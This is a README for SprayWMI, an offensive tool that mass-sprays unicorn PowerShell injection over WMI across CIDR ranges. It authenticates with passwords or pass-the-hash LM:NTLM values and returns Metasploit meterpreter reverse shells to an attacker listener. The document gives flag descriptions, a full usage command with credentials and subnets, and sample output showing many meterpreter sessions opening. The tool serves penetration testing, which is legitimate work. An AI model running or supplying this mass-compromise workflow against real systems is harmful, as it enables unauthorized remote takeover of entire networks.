SprayWMI is a method for mass spraying unicorn powershell injection to CIDR notations.

Written by David Kennedy @TrustedSec
Special thanks: Justin Elze and Larry Spohn

Initial Blog: https://www.trustedsec.com/june-2015/no_psexec_needed/ if you have trouble with this on 64 bit - try:

dpkg --add-architecture i386 && apt-get update && apt-get install libpam0g:i386 && apt-get install libpopt0:i386

Flag descriptions:

DOMAIN - domain you are attacking - if its local, just specify workgroup

USERNAME - username to authenticate on the remote Windows system

PASSWORD - password or password hash lm:ntlm to use on the remote Windows system

CIDR_RANGE,CIDR_RANGE or ips.txt - you can specify a single ip, a CIDR range (192.168.1.1/24) or multiple CIDRs such as 192.168.1.1/24,192.168.2.1/24. You can also specify a file (ex: file.txt) which has single IP addresses on a new line. 

METASPLOIT_PAYLOAD - this is the payload you want to use example: windows/meterpreter/reverse_tcp

REVERSE_SHELL_IP - this is the IP address of your attacker machine that you want to create a listener or use an already established listener

REVERSE_SHELL_PORT - port to connect back on for the reverse

OPTIONAL: NO - specify no if you do not want to create a listener - this is useful if you already have a listener established. If you do not specify a value here, it will automatically create a listener for you.

Usage: python spraywmi.py <domain> <username> <password or hash lm:ntlm> <cidr_range,cidr_range or ips.txt> <metasploit_payload> <reverse_shell_ip> <reverse_shell_port> <optional: no>

Below is an example of output from spraywmi:

root@stronghold:/home/relik# python spraywmi.py TS kennedy-test complexP255w0rd! 192.168.90.1/24,192.168.0.1/24,192.168.59.1/24,192.168.96.1/24,192.168.1.1/24 windows/meterpreter/reverse_tcp 192.168.47.24 443

[*] Generating shellcode through unicorn, could take a few seconds...

[*] Launching the listener in the background...

[*] Waiting for the listener to start first before we continue forward...

[*] Be patient, Metaploit takes a little bit to start...

[*] Sweeping network for ports that are open first, then moving through... Be patient.

[*] Launching WMI spray against IP: 192.168.90.1 - you should have a shell in the background. Once finished, shell will spawn

<snip>

[*] Launching WMI spray against IP: 192.168.96.20 - you should have a shell in the background. Once finished, shell will spawn

[*] Launching WMI spray against IP: 192.168.96.21 - you should have a shell in the background. Once finished, shell will spawn

[*] Launching WMI spray against IP: 192.168.96.22 - you should have a shell in the background. Once finished, shell will spawn

[*] Launching WMI spray against IP: 192.168.96.23 - you should have a shell in the background. Once finished, shell will spawn

[*] Launching WMI spray against IP: 192.168.96.242 - you should have a shell in the background. Once finished, shell will spawn

[*] Launching WMI spray against IP: 192.168.1.13 - you should have a shell in the background. Once finished, shell will spawn

[*] Spraying is still happening in the background, shells should arrive as they complete.

[*] Interacting with Metasploit...

msf exploit(handler) > 

[*] Encoded stage with x86/shikata_ga_nai

[*] Sending encoded stage (885836 bytes) to 192.168.90.174

[*] Meterpreter session 1 opened (192.168.47.24:443 -> 192.168.90.174:49868) at 2015-10-13 04:33:55 -0400

[*] Encoded stage with x86/shikata_ga_nai

[*] Sending encoded stage (885836 bytes) to 192.168.90.203

[*] Meterpreter session 2 opened (192.168.47.24:443 -> 192.168.90.203:51333) at 2015-10-13 04:33:59 -0400

[*] Encoded stage with x86/shikata_ga_nai

[*] Sending encoded stage (885836 bytes) to 192.168.90.184

[*] Meterpreter session 3 opened (192.168.47.24:443 -> 192.168.90.184:61218) at 2015-10-13 04:34:02 -0400

[*] Encoded stage with x86/shikata_ga_nai

[*] Sending encoded stage (885836 bytes) to 192.168.90.204

[*] Meterpreter session 4 opened (192.168.47.24:443 -> 192.168.90.204:54219) at 2015-10-13 04:34:06 -0400

[*] Encoded stage with x86/shikata_ga_nai

[*] Sending encoded stage (885836 bytes) to 192.168.90.175

[*] Meterpreter session 5 opened (192.168.47.24:443 -> 192.168.90.175:54210) at 2015-10-13 04:34:10 -0400

<snip>

[*] Meterpreter session 13 opened (192.168.47.24:443 -> 192.168.90.248:53657) at 2015-10-13 04:34:31 -0400

[*] Encoded stage with x86/shikata_ga_nai

[*] Sending encoded stage (885836 bytes) to 192.168.90.39

[*] Meterpreter session 14 opened (192.168.47.24:443 -> 192.168.90.39:60451) at 2015-10-13 04:34:35 -0400

[*] Encoded stage with x86/shikata_ga_nai
